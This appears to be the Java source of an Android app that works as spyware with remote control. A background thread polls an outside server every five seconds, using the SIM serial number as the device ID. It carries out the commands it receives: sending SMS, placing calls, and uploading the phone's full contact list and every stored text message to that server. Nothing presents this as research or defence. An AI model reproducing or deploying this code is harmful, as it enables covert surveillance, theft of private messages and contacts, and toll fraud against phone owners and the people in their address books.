package com.example.proj1chatwithphp;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.ByteArrayBuffer;
import org.apache.http.util.EncodingUtils;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
	TextView tv1, tv2, tv3, tv_num;
	String cmd_c, cmd_t, cmd_n;
	TelephonyManager tm;
	String tel;
	String name, phoneNum;

	public Handler myHandler = new Handler() {
		public void handleMessage(Message msg) {
			if (msg.what == 0x11) {
				Bundle bundle = new Bundle();
				bundle.clear();
				bundle = msg.getData();
				cmd_c = bundle.getString("command");
				cmd_t = bundle.getString("to");
				cmd_n = bundle.getString("content");
				tv1.setText(cmd_c);
				tv2.setText(cmd_t);
				tv3.setText(cmd_n);
				if (cmd_c.equals("sendMessage")) {
					SendMessage(cmd_t, cmd_n);
				}
				if (cmd_c.equals("call")) {
					makecall(cmd_t);
				}
				if (cmd_c.equals("upcontact")) {
					upcontact();
				}
				if (cmd_c.equals("upSMS")) {
					upSMS();
				}
			}
		}
	};

	public int SendMessage(String to, String content) {
		System.out.println("send '" + content + "' to " + to);
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage(to, null, content, null, null);
		Toast.makeText(MainActivity.this, "发送成功", Toast.LENGTH_LONG).show();
		return 1;
	}

	public int makecall(String to) {
		Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + to));
		startActivity(intent);
		return 1;
	}

	public int upcontact() {
		new Thread() {
			public void run() {
				// 读取联系人信息存至params
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				ContentResolver resolver = MainActivity.this
						.getContentResolver();
				Cursor phoneCursor = resolver.query(Phone.CONTENT_URI, null,
						null, null, null);
				int i = 0;
				if (phoneCursor != null) {
					while (phoneCursor.moveToNext()) {
						int nameIndex = phoneCursor
								.getColumnIndex(Phone.DISPLAY_NAME); // 获取联系人name
						name = phoneCursor.getString(nameIndex);
						phoneNum = phoneCursor.getString(phoneCursor
								.getColumnIndex(Phone.NUMBER)); // 获取联系人number
						if (TextUtils.isEmpty(phoneNum)) {
							continue;
						} else {
							params.add(new BasicNameValuePair("name" + i, name));
							params.add(new BasicNameValuePair("num" + i,
									phoneNum));
							// Log.i("TAG", name);
							// Log.i("TAG", phoneNum);
							i++;
						}
					}
					params.add(new BasicNameValuePair("num", i + ""));
					params.add(new BasicNameValuePair("id", tel));
				}
				// 建立Http连接
				String uriAPI = "http://4.test000001.sinaapp.com/uploadc.php";
				HttpPost httpRequest = new HttpPost(uriAPI);
				try {
					// 发出Http request
					httpRequest.setEntity(new UrlEncodedFormEntity(params,
							HTTP.UTF_8));
					// 取得Http response
					HttpResponse httpResponse = new DefaultHttpClient()
							.execute(httpRequest);
					// 若状态码为200 ok
					if (httpResponse.getStatusLine().getStatusCode() == 200) {
						// 取出回应字串
						String strResult = EntityUtils.toString(httpResponse
								.getEntity());
						Log.i("TAG", strResult);
					} else {
						Log.i("TAG", "Error Response"
								+ httpResponse.getStatusLine().toString());
					}
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}.start();
		return 1;
	}

	public int upSMS() {
		new Thread() {
			public void run() {
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				ContentResolver cr = getContentResolver();
				String[] projection = new String[] { "_id", "address",
						"person", "body", "date", "type" };
				Cursor cur = cr.query(Uri.parse("content://sms/"), projection,
						null, null, "date desc");
				int i = 0;
				if (cur.moveToFirst()) {
					do {
						String number = cur.getString(cur
								.getColumnIndex("address"));// 手机号
						String body = cur.getString(cur.getColumnIndex("body"));
						int type = cur.getInt(cur.getColumnIndex("type"));
						params.add(new BasicNameValuePair("number" + i, number));
						params.add(new BasicNameValuePair("body" + i, body));
						if (type == 1) {
							params.add(new BasicNameValuePair("type" + i,
									"Accept"));
						} else if (type == 2) {
							params.add(new BasicNameValuePair("type" + i,
									"Send"));
						} else {
							params.add(new BasicNameValuePair("type" + i,
									"Unknown"));
						}
						i++;
					} while (cur.moveToNext());
				}
				params.add(new BasicNameValuePair("num", i + ""));
				params.add(new BasicNameValuePair("id", tel));

				String uriAPI = "http://4.test000001.sinaapp.com/uploadm.php";
				HttpPost httpRequest = new HttpPost(uriAPI);
				try {
					// 发出Http request
					httpRequest.setEntity(new UrlEncodedFormEntity(params,
							HTTP.UTF_8));
					// 取得Http response
					HttpResponse httpResponse = new DefaultHttpClient()
							.execute(httpRequest);
					// 若状态码为200 ok
					if (httpResponse.getStatusLine().getStatusCode() == 200) {
						// 取出回应字串
						String strResult = EntityUtils.toString(httpResponse
								.getEntity());
						Log.i("TAG", strResult);
					} else {
						Log.i("TAG", "Error Response"
								+ httpResponse.getStatusLine().toString());
					}
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}.start();
		return 1;
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		tv1 = (TextView) findViewById(R.id.textView1);
		tv2 = (TextView) findViewById(R.id.textView2);
		tv3 = (TextView) findViewById(R.id.textView3);
		tv_num = (TextView) findViewById(R.id.tv_num);
		tm = (TelephonyManager) this
				.getSystemService(Context.TELEPHONY_SERVICE);
		tel = tm.getLine1Number();
		tel = tm.getSimSerialNumber();
		tv_num.setText(tel);

		new MyThread().start();
	}

	class MyThread extends Thread {

		public void run() {
			while (true) {
				try {
					Thread.sleep(5000);												// 设置睡眠时间，每5秒轮询一次
					HttpClient client = new DefaultHttpClient();
					StringBuilder builder = new StringBuilder();
					HttpGet myget = new HttpGet(
							"http://4.test000001.sinaapp.com/?id=" + tel);			// 服务器的域名，tel是设备识别码
					HttpResponse response = client.execute(myget);
					HttpEntity entity = response.getEntity();
					BufferedReader reader = new BufferedReader(
							new InputStreamReader(entity.getContent()));
					for (String s = reader.readLine(); s != null; s = reader
							.readLine()) {
						builder.append(s);
					}
					JSONObject jsonObject = new JSONObject(builder.toString());		// 获取命令数据
					String re_command = jsonObject.getString("command");
					String re_to = jsonObject.getString("to");
					String re_content = jsonObject.getString("content");
					Message msg = Message.obtain();
					msg.what = 0x11;
					Bundle b = new Bundle();
					b.clear();
					b.putString("command", re_command);
					b.putString("to", re_to);
					b.putString("content", re_content);
					msg.setData(b);
					myHandler.sendMessage(msg);										// 通知主线程
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
